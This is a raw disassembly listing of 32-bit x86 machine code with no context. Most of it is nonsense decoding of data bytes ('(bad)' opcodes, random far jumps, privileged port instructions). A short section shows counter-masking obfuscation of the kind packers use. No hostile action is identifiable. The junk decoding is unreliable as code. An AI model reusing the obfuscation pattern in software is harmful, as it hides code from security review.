  41edcf:	mov    ebp,0x3abc6bd0
  41edd4:	mov    ch,0xf3
  41edd6:	cld    
  41edd7:	fiadd  DWORD PTR [esi+edi*2+0x1e697015]
  41edde:	jae    0x41ee3b
  41ede0:	fild   WORD PTR [esi-0x38dba74b]
  41ede6:	dec    edi
  41ede7:	inc    esi
  41ede8:	dec    ebx
  41ede9:	mov    ds:0xc3002d82,al
  41edee:	repnz push es
  41edf0:	dec    ecx
  41edf1:	repnz loope 0x41edfc
  41edf4:	mov    edi,0x5f62fbf8
  41edf9:	add    ah,BYTE PTR [ebp-0x23]
  41edfc:	test   bh,0x9f
  41edff:	xchg   DWORD PTR [edx+ebp*1+0x587b2376],eax
  41ee06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee07:	jge    0x41ee36
  41ee09:	into   
  41ee0a:	lds    eax,FWORD PTR [ebx]
  41ee0c:	xchg   DWORD PTR [eax-0x6390acb9],eax
  41ee12:	add    BYTE PTR [eax-0x32],dl
  41ee15:	lods   al,BYTE PTR ds:[esi]
  41ee16:	lea    eax,ds:0xf4879d5e
  41ee1c:	call   0xdca6eb11
  41ee21:	imul   ebp,DWORD PTR [ebp-0x1c],0x63
  41ee25:	xor    BYTE PTR [esp+eax*2],ah
  41ee28:	cmp    dl,BYTE PTR [edi+ebp*4+0x2c7619d5]
  41ee2f:	pop    eax
  41ee30:	je     0x41ee2d
  41ee32:	cmp    eax,0x6eaa5c9b
  41ee37:	dec    edi
  41ee38:	popf   
  41ee39:	or     al,BYTE PTR [edx-0x7a]
  41ee3c:	add    ah,BYTE PTR ds:0xd5ceb091
  41ee42:	cdq    
  41ee43:	(bad)  
  41ee44:	xchg   DWORD PTR [edi-0x47],esi
  41ee47:	mov    al,0xc4
  41ee49:	lea    esi,[edi]
  41ee4b:	(bad)  
  41ee4d:	add    DWORD PTR [edx+ebx*8+0x3474b82c],ecx
  41ee54:	out    dx,eax
  41ee55:	pinsrw mm4,WORD PTR [ecx],0x38
  41ee59:	(bad)  
  41ee5a:	adc    eax,DWORD PTR [ecx-0x36]
  41ee5d:	es into 
  41ee5f:	push   0x8e34f236
  41ee64:	pusha  
  41ee65:	sbb    dh,BYTE PTR [edi]
  41ee67:	xchg   esp,eax
  41ee68:	jmp    0x41ee5b
  41ee6a:	jne    0x41ee51
  41ee6c:	sbb    eax,0x6f62dd92
  41ee71:	dec    ebp
  41ee72:	addr16 into 
  41ee74:	add    DWORD PTR [ebp+0x18],esp
  41ee77:	nop
  41ee78:	in     eax,0xd2
  41ee7a:	or     dh,BYTE PTR [eax]
  41ee7c:	nop
  41ee7d:	mov    eax,0xe8053dc0
  41ee82:	jae    0x41eee9
  41ee84:	faddp  st(2),st
  41ee86:	fisttp QWORD PTR [ebx]
  41ee88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee89:	lea    eax,[ebx]
  41ee8b:	es adc al,0x99
  41ee8e:	pop    esi
  41ee8f:	push   ss
  41ee90:	cdq    
  41ee91:	fistp  WORD PTR [eax-0x1]
  41ee94:	aad    0x4d
  41ee96:	and    al,0x28
  41ee98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee99:	sub    DWORD PTR [edx+0x19],esp
  41ee9c:	pop    edx
  41ee9d:	jle    0x41eec6
  41ee9f:	fnstenv [esi+eax*1]
  41eea2:	and    BYTE PTR [esi+0x73],dl
  41eea5:	retf   0xfb2f
  41eea8:	sub    dl,bh
  41eeaa:	push   esp
  41eeab:	leave  
  41eeac:	loop   0x41ee53
  41eeae:	xor    BYTE PTR [edx-0x22],dh
  41eeb1:	or     esp,DWORD PTR [ecx]
  41eeb3:	pop    ss
  41eeb4:	sti    
  41eeb5:	mov    ebx,0xbc0de815
  41eeba:	sub    al,0x26
  41eebc:	stos   BYTE PTR es:[edi],al
  41eebd:	cmp    dl,BYTE PTR [edi-0x31]
  41eec0:	loop   0x41ee6b
  41eec2:	dec    edx
  41eec3:	out    0x27,al
  41eec5:	adc    bh,0xe9
  41eec8:	in     eax,dx
  41eec9:	aas    
  41eeca:	call   0x6a44:0xf5e0dec7
  41eed1:	cdq    
  41eed2:	push   edx
  41eed3:	rcl    dh,1
  41eed5:	retf   
  41eed6:	mov    cl,0x20
  41eed8:	adc    al,ah
  41eeda:	add    al,0x3
  41eedc:	sti    
  41eedd:	push   ecx
  41eede:	cs push 0x943b996c
  41eee4:	xor    ch,BYTE PTR [esi]
  41eee6:	inc    edi
  41eee7:	mov    edi,DWORD PTR [edx]
  41eee9:	or     al,0x5e
  41eeeb:	push   0xffffffde
  41eeed:	sbb    BYTE PTR ds:[ecx-0x38],dh
  41eef1:	jmp    0x41ef2a
  41eef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eef4:	dec    ebp
  41eef5:	dec    edx
  41eef6:	jg     0x41eeb8
  41eef8:	ja     0x41eea8
  41eefa:	jmp    0x4c4d3954
  41eeff:	sar    dh,cl
  41ef01:	(bad)  
  41ef03:	jmp    0x41eed2
  41ef05:	scas   eax,DWORD PTR es:[edi]
  41ef06:	ss std 
  41ef08:	fucomp st(3)
  41ef0a:	sub    eax,0x75ec763a
  41ef0f:	or     eax,0x9fa11d5f
  41ef14:	xor    ebp,DWORD PTR [ebp+ebp*4+0x600fc09e]
  41ef1b:	dec    edx
  41ef1c:	mov    ah,0xef
  41ef1e:	ds jge 0x41ef44
  41ef21:	daa    
  41ef22:	dec    edi
  41ef23:	fnstenv [edx+0x3b12c6f8]
  41ef29:	or     DWORD PTR [ebx+edi*4+0x745f5fdb],edx
  41ef30:	add    DWORD PTR [eax-0x35545353],edi
  41ef36:	shl    BYTE PTR [edi-0x19],cl
  41ef39:	pop    ebp
  41ef3a:	jl     0x41ef4c
  41ef3c:	xor    BYTE PTR [ecx+0x13],dh
  41ef3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef40:	hlt    
  41ef41:	mov    al,0xd9
  41ef43:	mov    edi,0xcab3992c
  41ef48:	ror    esi,1
  41ef4a:	xchg   esp,eax
  41ef4b:	jl     0x41eedf
  41ef4d:	sbb    bh,BYTE PTR ds:0xf2cd82b0
  41ef53:	sbb    bl,dl
  41ef55:	push   cs
  41ef56:	push   ss
  41ef57:	jp     0x41ef5c
  41ef59:	fwait
  41ef5a:	jp     0x41ef32
  41ef5c:	push   cs
  41ef5d:	fisttp DWORD PTR [esi*8-0x2eca06f6]
  41ef64:	sbb    DWORD PTR [ebx+0x9b1b1d9],ebp
  41ef6a:	fiadd  DWORD PTR [eax+0x10]
  41ef6d:	add    bh,BYTE PTR [eax]
  41ef6f:	or     BYTE PTR [edi],ah
  41ef71:	jmp    0x82b5:0xbb1f05c5
  41ef78:	pop    ebx
  41ef79:	or     eax,0x3c065f4b
  41ef7e:	icebp  
  41ef7f:	push   ss
  41ef80:	mov    edi,DWORD PTR [esi+0x9]
  41ef83:	and    ebp,DWORD PTR [edi-0x62bab4ff]
  41ef89:	iret   
  41ef8a:	call   0xb475:0x7dc922a9
  41ef91:	jmp    0x27a4:0x916c0c0b
  41ef98:	or     eax,0xe7575c1b
  41ef9d:	gs mov dh,0x20
  41efa0:	rol    BYTE PTR [edx+0x48],cl
  41efa3:	call   0x18f7f209
  41efa8:	call   0xa7c7da31
  41efad:	pusha  
  41efae:	sub    BYTE PTR [edx],dh
  41efb0:	hlt    
  41efb1:	mov    ds:0xeb1c150a,eax
  41efb6:	(bad)  
  41efb7:	sbb    edx,DWORD PTR [ecx]
  41efb9:	test   DWORD PTR [eax-0x54142ee8],esi
  41efbf:	mov    ebx,0xdf4c045
  41efc4:	leave  
  41efc5:	enter  0xa17,0xc4
  41efc9:	pop    ss
  41efca:	xchg   ebx,eax
  41efcb:	cmp    eax,0xad441cdf
  41efd0:	imul   BYTE PTR [edx+0x1b095fff]
  41efd6:	jnp    0x41f045
  41efd8:	call   0x152d:0x262355d3
  41efdf:	xchg   edx,eax
  41efe0:	test   eax,0xec22cf0e
  41efe5:	dec    ecx
  41efe6:	iret   
  41efe7:	or     al,BYTE PTR [edi]
  41efe9:	sub    edx,DWORD PTR [edx-0x67]
  41efec:	and    esp,DWORD PTR [edx]
  41efee:	xor    esi,0x4acc3cff
  41eff4:	call   0x9d83:0xf46697f4
  41effb:	jb     0x41f067
  41effd:	icebp  
  41effe:	xor    ecx,eax
  41f000:	add    ecx,esi
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x42a86403
  41f0bf:	sbb    DWORD PTR [ecx+0x51],0x3c6261d8
  41f0c6:	pop    edi
  41f0c7:	bound  esp,QWORD PTR [edx-0x9]
  41f0ca:	iret   
  41f0cb:	pop    ds
  41f0cc:	push   edi
  41f0cd:	sub    edx,DWORD PTR [ebp+0x3d39f943]
  41f0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0d4:	dec    ebx
  41f0d5:	or     al,0x2f
  41f0d7:	fnstsw WORD PTR [edx+0x6b]
  41f0da:	push   esi
  41f0db:	loope  0x41f10e
  41f0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0de:	jp     0x41f07f
  41f0e0:	and    eax,0x25a99fc8
  41f0e5:	adc    al,0x2a
  41f0e7:	jnp    0x41f148
  41f0e9:	xchg   esi,eax
  41f0ea:	jl     0x41f161
  41f0ec:	pop    esp
  41f0ed:	(bad)  [edx+0x75]
  41f0f0:	jmp    0x3281dc68
  41f0f5:	in     al,0x4
  41f0f7:	mov    edx,0x640ed972
  41f0fc:	test   al,0xe8
  41f0fe:	xchg   edx,eax
  41f0ff:	in     eax,dx
  41f100:	sbb    bl,BYTE PTR [ebp+0x6aa6c228]
  41f106:	in     eax,dx
  41f107:	xchg   esi,eax
  41f108:	cdq    
  41f109:	aad    0x49
  41f10b:	cdq    
  41f10c:	jmp    0x41f168
  41f10e:	xchg   al,al
  41f110:	mov    dh,BYTE PTR [ecx]
  41f112:	jno    0x41f157
  41f114:	cs pop es
  41f116:	xchg   BYTE PTR [ebx+0x60a8f12f],al
  41f11c:	sbb    edx,ebx
  41f11e:	test   BYTE PTR [ebx],ch
  41f120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f121:	add    eax,0x3994fc73
  41f126:	mov    ebp,0x736ba78b
  41f12b:	cmp    DWORD PTR [esi+0x3b],esp
  41f12e:	pop    esp
  41f12f:	mov    ecx,0xb4ccce62
  41f134:	push   esp
  41f135:	stc    
  41f136:	and    DWORD PTR [ecx],edx
  41f138:	mov    gs,WORD PTR [ecx]
  41f13a:	aad    0x7b
  41f13c:	sub    esi,DWORD PTR [edx+ebp*8+0x53]
  41f140:	sbb    al,0xcd
  41f142:	xor    eax,0xa33532c4
  41f147:	fstp   QWORD PTR [esi-0x3d7f3956]
  41f14d:	aam    0x77
  41f14f:	or     eax,0x113778d9
  41f154:	cmp    al,0x3d
  41f156:	inc    ebx
  41f157:	or     DWORD PTR [ebx+0x5a372085],ecx
  41f15d:	push   es
  41f15e:	ins    DWORD PTR es:[edi],dx
  41f15f:	(bad)  
  41f160:	into   
  41f161:	retf   0x3a8a
  41f164:	dec    ebp
  41f165:	cmp    BYTE PTR [edi],dh
  41f167:	push   ds
  41f168:	out    0x9,al
  41f16a:	cmp    BYTE PTR [esi],al
  41f16c:	and    DWORD PTR [eax-0x5e],edx
  41f16f:	sbb    edx,DWORD PTR [edi]
  41f171:	mov    ebp,0x920aa8ed
  41f176:	sahf   
  41f177:	ins    DWORD PTR es:[edi],dx
  41f178:	inc    esi
  41f179:	arpl   WORD PTR [edx+0x35],ax
  41f17c:	add    al,0x81
  41f17e:	mov    ebp,0xcb6e8d2
  41f183:	inc    BYTE PTR [ecx+0x314f0454]
  41f189:	loope  0x41f1b3
  41f18b:	xor    DWORD PTR [esi+ecx*4],esp
  41f18e:	leave  
  41f18f:	aas    
  41f190:	(bad)  
  41f191:	mov    DWORD PTR [ebx],edx
  41f193:	call   0x2e65dd51
  41f198:	push   0x21
  41f19a:	push   es
  41f19b:	dec    edi
  41f19c:	push   esp
  41f19d:	cmp    DWORD PTR [ecx+0x5d],esi
  41f1a0:	or     al,0xe0
  41f1a2:	mov    dh,0xc9
  41f1a4:	inc    eax
  41f1a5:	in     eax,0x6b
  41f1a7:	adc    dh,BYTE PTR [ecx*1+0x68b3d81f]
  41f1ae:	xor    al,0xea
  41f1b0:	sub    eax,0x7d090b16
  41f1b5:	outs   dx,DWORD PTR ds:[esi]
  41f1b6:	jno    0x41f21c
  41f1b8:	pop    esp
  41f1b9:	aaa    
  41f1ba:	leave  
  41f1bb:	dec    ebp
  41f1bc:	mov    ds:0x1c5f3649,eax
  41f1c1:	add    DWORD PTR [edi+0x6f],0xffffff96
  41f1c5:	(bad)  
  41f1c6:	icebp  
  41f1c7:	cmp    BYTE PTR [edx-0x43],0x33
  41f1cb:	mov    ds:0xa5e6fbe5,eax
  41f1d0:	jmp    0x41f1b7
  41f1d2:	fwait
  41f1d3:	mov    BYTE PTR [edi+0x4516ad3e],cl
  41f1d9:	shl    BYTE PTR [edi-0x56f05b9a],cl
  41f1df:	cld    
  41f1e0:	loop   0x41f1dd
  41f1e2:	mov    eax,DWORD PTR [eax-0x30]
  41f1e5:	add    eax,0xdc5107ad
  41f1ea:	pop    ss
  41f1eb:	add    DWORD PTR [eax],0xef94eb34
  41f1f1:	lea    ebp,[eax-0x5cdd1dd2]
  41f1f7:	stc    
  41f1f8:	add    al,0xd1
  41f1fa:	inc    edi
  41f1fb:	cli    
  41f1fc:	pop    ebx
  41f1fd:	ret    0x5887
  41f200:	dec    esp
  41f201:	popa   
  41f202:	imul   esp,DWORD PTR [ecx-0x2206a9a9],0x90791b93
  41f20c:	jae    0x41f1b2
  41f20e:	and    BYTE PTR ds:0x661d5e3a,ch
  41f214:	jp     0x41f1c0
  41f216:	mov    eax,ds:0x38723ac7
  41f21b:	ins    DWORD PTR es:[edi],dx
  41f21c:	xchg   ebp,eax
  41f21d:	pop    ds
  41f21e:	ins    BYTE PTR es:[edi],dx
  41f21f:	dec    ebp
  41f220:	imul   edi,DWORD PTR [eax+0x71b23dd3],0x64d256d
  41f22a:	cld    
  41f22b:	pop    ebp
  41f22c:	push   esp
  41f22d:	mov    ch,0xb5
  41f22f:	xlat   BYTE PTR ds:[ebx]
  41f230:	loope  0x41f23c
  41f232:	(bad)  
  41f234:	out    0x5,eax
  41f236:	cs in  eax,dx
  41f238:	adc    esp,DWORD PTR [ebx+eax*8+0x1b]
  41f23c:	cmp    eax,0x2c7036d8
  41f241:	pop    edi
  41f242:	xchg   ebx,eax
  41f243:	dec    ecx
  41f244:	mov    ecx,0xa63b078c
  41f249:	fldenv [ecx-0x4]
  41f24c:	mov    ebx,0xad1223ae
  41f251:	inc    esp
  41f252:	and    eax,DWORD PTR [ecx-0x5d]
  41f255:	loope  0x41f283
  41f257:	(bad)  [esi-0x167fec59]
  41f25d:	fnstcw WORD PTR [edi-0x8]
  41f260:	in     al,0x37
  41f262:	repnz xor eax,0x5e0547a0
  41f268:	loope  0x41f24d
  41f26a:	mov    fs,WORD PTR [eax+ebp*1]
  41f26d:	rol    ebp,0x4a
  41f270:	mov    BYTE PTR [eax+0x61],ah
  41f273:	jae    0x41f2c8
  41f275:	bound  esp,QWORD PTR [ebx-0x7c]
  41f278:	aas    
  41f279:	fmul   DWORD PTR [esp+edx*2+0x21]
  41f27d:	outs   dx,DWORD PTR ds:[esi]
  41f27e:	push   ecx
  41f27f:	jno    0x41f2db
  41f281:	aam    0xbc
  41f283:	stos   BYTE PTR es:[edi],al
  41f284:	and    esp,DWORD PTR [ebx+0x30c4c2e5]
  41f28a:	push   es
  41f28b:	mov    ebx,0x8caddf9f
  41f290:	xor    BYTE PTR [edx],dh
  41f292:	aas    
  41f293:	pop    esp
  41f294:	loope  0x41f298
  41f296:	cdq    
  41f297:	(bad)
  41f29b:	(bad)  
  41f29c:	or     ch,BYTE PTR [ecx]
  41f29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f29f:	(bad)  
  41f2a0:	jno    0x41f2f6
  41f2a2:	call   DWORD PTR [esi]
  41f2a4:	adc    esp,DWORD PTR [ebx+0x12f6e5df]
  41f2aa:	sub    DWORD PTR ds:[ebp-0x472ce2c5],edi
  41f2b1:	xor    dl,bl
  41f2b3:	icebp  
  41f2b4:	dec    BYTE PTR [ebx-0x1c]
  41f2b7:	pop    ecx
  41f2b8:	ss fwait
  41f2ba:	repnz pop ss
  41f2bc:	outs   dx,DWORD PTR ds:[esi]
  41f2bd:	std    
  41f2be:	fsub   QWORD PTR [ebx+ebp*2]
  41f2c1:	mov    DWORD PTR [eax+0x4a],0xd9822443
  41f2c8:	add    ah,0x7f
  41f2cb:	repz out dx,eax
  41f2cd:	pop    esp
  41f2ce:	ss enter 0x9f4c,0xa1
  41f2d3:	(bad)  
  41f2d4:	ss jnp 0x41f28b
  41f2d7:	(bad)  
  41f2d8:	cmc    
  41f2d9:	das    
  41f2da:	hlt    
  41f2db:	sbb    eax,0x9050f680
  41f2e0:	call   0xc2d70bf8
  41f2e5:	rcl    ch,cl
  41f2e7:	xor    cl,BYTE PTR [eax+0x23c995bc]
  41f2ed:	int    0xd7
  41f2ef:	retf   0xc07f
  41f2f2:	jmp    0x41f318
  41f2f4:	push   es
  41f2f5:	and    bl,BYTE PTR [edx]
  41f2f7:	or     bl,bh
  41f2f9:	test   DWORD PTR [ebx+0x6761332b],esi
  41f2ff:	fisub  WORD PTR [ecx]
  41f301:	add    al,0xf9
  41f303:	inc    edx
  41f304:	(bad)  
  41f306:	xlat   BYTE PTR ds:[ebx]
  41f307:	push   0xffffffa3
  41f309:	sub    bl,BYTE PTR [ecx]
  41f30b:	mov    eax,0x3258c56d
  41f310:	sub    DWORD PTR [ebp+0x6f],edi
  41f313:	dec    esi
  41f314:	out    0x1e,al
  41f316:	jb     0x41f378
  41f318:	add    DWORD PTR [edi],esi
  41f31a:	adc    al,0xde
  41f31c:	pop    ebx
  41f31d:	ffreep st(1)
  41f31f:	pop    ecx
  41f320:	add    BYTE PTR [ebp+0x4e],dl
  41f323:	fistp  QWORD PTR [ebp+0x824e790]
  41f329:	das    
  41f32a:	jl     0x41f320
  41f32c:	mov    ss,WORD PTR [ebp-0x35a074d5]
  41f332:	sub    bl,BYTE PTR [eax]
  41f334:	add    edx,eax
  41f336:	pop    ebx
  41f337:	jmp    0x5fda:0x5b696028
  41f33e:	or     ecx,ecx
  41f340:	cs out 0x0,al
  41f343:	xchg   esi,eax
  41f344:	push   edi
  41f345:	pop    es
  41f346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f347:	mov    al,0x36
  41f349:	popf   
  41f34a:	call   0x62bf:0x460e38e8
  41f351:	and    esp,ecx
  41f353:	mov    esp,0x62363527
  41f358:	adc    DWORD PTR [eax],ebp
  41f35a:	sbb    al,0x19
  41f35c:	or     DWORD PTR [ebx+0x2fdb6008],eax
  41f362:	int    0xe7
  41f364:	out    dx,eax
  41f365:	gs xchg ecx,eax
  41f367:	std    
  41f368:	or     al,0xcb
  41f36a:	add    al,BYTE PTR [ecx]
  41f36c:	mul    edi
  41f36e:	xchg   edx,eax
  41f36f:	fwait
  41f370:	and    BYTE PTR [edi],dh
  41f372:	add    al,0xa7
  41f374:	cmp    dl,BYTE PTR [ecx-0x7c14881b]
  41f37a:	cld    
  41f37b:	(bad)  
  41f37c:	pusha  
  41f37d:	cdq    
  41f37e:	mov    edx,0x7a255b80
  41f383:	add    BYTE PTR [ebp+ecx*4+0x3a0a4c28],ch
  41f38a:	imul   esp,DWORD PTR [ecx-0x36],0x3d
  41f38e:	mov    ecx,0x98d39425
  41f393:	out    0x63,eax
  41f395:	cmp    ebx,DWORD PTR [eax-0x4390c9fb]
  41f39b:	jmp    0xc3a3cac8
  41f3a0:	mov    al,ds:0xf39521c5
  41f3a5:	scas   eax,DWORD PTR es:[edi]
  41f3a6:	mov    dh,0x1b
  41f3a8:	or     eax,0xd16a9ba4
  41f3ad:	cdq    
  41f3ae:	inc    di
  41f3b0:	call   FWORD PTR [eax]
  41f3b2:	in     eax,dx
  41f3b3:	pushf  
  41f3b4:	sbb    bh,BYTE PTR ds:0xa434f3cf
  41f3ba:	mov    dh,BYTE PTR [edi]
  41f3bc:	imul   edx,DWORD PTR [edi],0x2c1e4fa1
  41f3c2:	and    bh,BYTE PTR [ecx+0x55]
  41f3c5:	arpl   WORD PTR [edi],si
  41f3c7:	outs   dx,BYTE PTR ds:[esi]
  41f3c8:	stos   BYTE PTR es:[edi],al
  41f3c9:	sbb    DWORD PTR [ecx+0x15ac7006],0xf6a7736c
  41f3d3:	fld    TBYTE PTR [edi+ebx*1]
  41f3d6:	out    dx,eax
  41f3d7:	call   0x7dedd58e
  41f3dc:	jbe    0x41f39c
  41f3de:	outs   dx,DWORD PTR ds:[esi]
  41f3df:	ret    0x4e7c
  41f3e2:	dec    ebp
  41f3e3:	push   0x23
  41f3e5:	loopne 0x41f424
  41f3e7:	pop    esi
  41f3e8:	aaa    
  41f3e9:	outs   dx,BYTE PTR ds:[esi]
  41f3ea:	bswap  edx
  41f3ec:	es sti 
  41f3ee:	add    BYTE PTR [ebp-0x1d],bh
  41f3f1:	jns    0x41f3e2
  41f3f3:	push   0xffffff8f
  41f3f5:	imul   ebx,DWORD PTR [eax+0xfe3253d],0xce7fab88
  41f3ff:	cmp    esp,DWORD PTR [edx]
  41f401:	mov    ebx,0x118ea773
  41f406:	(bad)  
  41f407:	xchg   ecx,eax
  41f408:	sbb    bh,ah
  41f40a:	adc    bh,0xde
  41f40d:	imul   eax,DWORD PTR [ebx-0x482a16cf],0xffffffd1
  41f414:	push   0x67
  41f416:	sub    al,bh
  41f418:	push   esp
  41f419:	push   es
  41f41a:	and    dh,0xa6
  41f41d:	add    eax,0xa13f8c12
  41f422:	mov    edi,0x1c310ef0
  41f427:	sbb    esp,DWORD PTR [esi+0x3fa503aa]
  41f42d:	(bad)  
  41f42e:	jno    0x41f3e0
  41f430:	fdiv   DWORD PTR [ebx+0x39]
  41f433:	(bad)  
  41f434:	sbb    edi,DWORD PTR [ebx+0x78]
  41f437:	add    BYTE PTR [esi+0x3d2e50c5],bl
  41f43d:	ret    0xda48
  41f440:	popa   
  41f441:	lods   eax,DWORD PTR ds:[esi]
  41f442:	out    dx,eax
  41f443:	dec    ebp
  41f444:	mov    es,WORD PTR [edx-0x5d]
  41f447:	cmc    
  41f448:	jg     0x41f3cf
  41f44a:	cs mov dh,0x8c
  41f44d:	gs hlt 
  41f44f:	sar    BYTE PTR [ebp+ebx*2-0x3474331b],cl
  41f456:	(bad)  
  41f457:	mov    dl,0xfd
  41f459:	stos   BYTE PTR es:[edi],al
  41f45a:	or     al,0x11
  41f45c:	xor    BYTE PTR [edi],cl
  41f45e:	nop
  41f45f:	xchg   DWORD PTR [edi+0x44f466e5],esp
  41f465:	cmp    al,0x76
  41f467:	jno    0x41f44d
  41f469:	inc    esi
  41f46a:	xchg   ebp,eax
  41f46b:	stos   BYTE PTR es:[edi],al
  41f46c:	popa   
  41f46d:	pop    esp
  41f46e:	adc    al,BYTE PTR [ebp+edi*2+0x73299d59]
  41f475:	pop    esi
  41f476:	xchg   esi,eax
  41f477:	push   edx
  41f478:	shl    DWORD PTR [esi+0x1d56c5b6],cl
  41f47e:	push   es
  41f47f:	push   0x6c
  41f481:	cmp    BYTE PTR [esi-0x4271aa17],0xfc
  41f488:	mov    esp,DWORD PTR [ebx+0x44950e14]
  41f48e:	mov    bh,0xb
  41f490:	mov    cl,bl
  41f492:	arpl   WORD PTR [edi],sp
  41f494:	pop    eax
  41f495:	nop
  41f496:	sub    DWORD PTR [eax-0x5d],ebp
  41f499:	std    
  41f49a:	mov    dh,0xc0
  41f49c:	std    
  41f49d:	data16 jbe 0x41f4b2
  41f4a0:	jmp    eax
  41f4a2:	(bad)  
  41f4a3:	je     0x41f470
  41f4a5:	push   ss
  41f4a6:	mov    eax,0xa6fe4c74
  41f4ab:	xchg   esi,eax
  41f4ac:	(bad)  
  41f4ae:	rcr    DWORD PTR [edx],cl
  41f4b0:	pushf  
  41f4b1:	inc    ecx
  41f4b2:	jo     0x41f47c
  41f4b4:	fxam   
  41f4b6:	inc    eax
  41f4b7:	shl    BYTE PTR [edi-0xf],1
  41f4ba:	(bad)  
  41f4bb:	ins    BYTE PTR es:[edi],dx
  41f4bc:	mov    DWORD PTR [eax-0x15990ad9],ebp
  41f4c2:	js     0x41f53b
  41f4c4:	vmovups ymm5,YMMWORD PTR [ebp-0x4d05cdda]
  41f4cc:	(bad)  
  41f4cd:	fdiv   QWORD PTR [ecx]
  41f4cf:	mov    edi,0x8541c44c
  41f4d4:	test   eax,0xee95ea3c
  41f4d9:	lods   al,BYTE PTR ds:[esi]
  41f4da:	adc    eax,DWORD PTR [ebp-0x6d8c8851]
  41f4e0:	push   ss
  41f4e1:	outs   dx,BYTE PTR ds:[esi]
  41f4e2:	mov    esi,0x17c56c81
  41f4e7:	rcl    BYTE PTR [eax+ebx*8-0x6a39664],1
  41f4ee:	push   esi
  41f4ef:	jnp    0x41f50d
  41f4f1:	rcr    al,0xe4
  41f4f4:	dec    ebp
  41f4f5:	jmp    0xbfef:0xbae0a8bc
  41f4fc:	rol    BYTE PTR [ebp+ebx*4+0x699ff389],1
  41f503:	pop    ebx
  41f504:	jmp    0x41f4e7
  41f506:	inc    ecx
  41f507:	jmp    0x6aad6c29
  41f50c:	je     0x41f4fb
  41f50e:	inc    eax
  41f50f:	in     eax,dx
  41f510:	pop    edx
  41f511:	lds    ebx,FWORD PTR [eax-0x3a]
  41f514:	mov    edx,0x1d74bbe5
  41f519:	adc    eax,0xeef9d615
  41f51e:	std    
  41f51f:	lods   eax,DWORD PTR ds:[esi]
  41f520:	mov    ch,BYTE PTR [edx-0x1b]
  41f523:	fwait
  41f524:	data16 test al,0x13
  41f527:	dec    esp
  41f528:	xor    bh,al
  41f52a:	mov    ds:0x6d3df26e,al
  41f52f:	inc    edi
  41f530:	or     edi,edi
  41f532:	setae  bh
  41f535:	inc    edi
  41f536:	fcom   DWORD PTR [edx-0x58f622df]
  41f53c:	js     0x41f517
  41f53e:	adc    eax,0x18697c96
  41f543:	(bad)  
  41f544:	or     dl,al
  41f546:	pop    ds
  41f547:	and    eax,0x28c347f9
  41f54c:	scas   al,BYTE PTR es:[edi]
  41f54d:	in     eax,0x42
  41f54f:	ss leave 
  41f551:	iret   
  41f552:	pop    ds
  41f553:	xor    DWORD PTR [eax+0x3],eax
  41f556:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f558:	cld    
  41f559:	addr16 mov ch,0x91
  41f55c:	pop    ss
  41f55d:	test   al,0xb0
  41f55f:	push   esp
  41f560:	add    BYTE PTR [ecx-0x1cba85c4],ah
  41f566:	adc    dh,ah
  41f568:	mov    ecx,0x57b2635d
  41f56d:	mov    cl,ah
  41f56f:	and    eax,0xcdd162c0
  41f574:	test   eax,0xfff52c10
  41f579:	int3   
  41f57a:	hlt    
